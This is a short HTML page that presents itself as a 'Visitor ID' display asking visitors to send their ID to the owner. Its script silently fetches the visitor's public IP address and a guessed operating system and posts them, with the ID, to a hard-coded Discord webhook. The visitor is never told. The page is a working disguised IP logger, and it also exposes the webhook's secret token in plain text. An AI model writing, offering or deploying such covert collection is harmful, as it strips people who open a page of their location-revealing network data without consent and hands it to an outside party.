<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Visitor ID</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .box { background: #f0f0f0; padding: 15px; border-radius: 8px; text-align: center; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Visitor ID (Send it to the owner)</h2>
    <p id="visitor"></p>
  </div>

  <script>
    // VARIABLES
    let visitorID = localStorage.getItem("visitorID");
    let deviceName = "Not available";
    let osName = "Unknown";
    let ipAddress = "Fetching...";

    // Create visitorID if missing
    if (!visitorID) {
      visitorID = crypto.randomUUID();
      localStorage.setItem("visitorID", visitorID);
    }

    // Detect OS
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) osName = "Windows";
    else if (ua.includes("Mac")) osName = "macOS";
    else if (ua.includes("Linux")) osName = "Linux";
    else if (ua.includes("Android")) osName = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS";

    // Show Visitor ID
    document.getElementById("visitor").textContent = visitorID;

    // Fetch IP
    fetch("https://api.ipify.org?format=json")
      .then(r => r.json())
      .then(data => {
        ipAddress = data.ip;

        // SEND TO WEBHOOK
        const webhookURL = "https://discord.com/api/webhooks/1442178514911625358/7XnMXNkc-Sxjv-xTFgp89ARbLkGMdTefufyFZnjBV3CJU0sBwPax6VMCPfuzjNjfIKhe";
        const payload = {
          content: 
            "**New Visitor**\n" +
            `ID: ${visitorID}\n` +
            `OS: ${osName}\n` +
            `Device: ${deviceName}\n` +
            `IP: ${ipAddress}`
        };

        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      });
  </script>
</body>
</html>
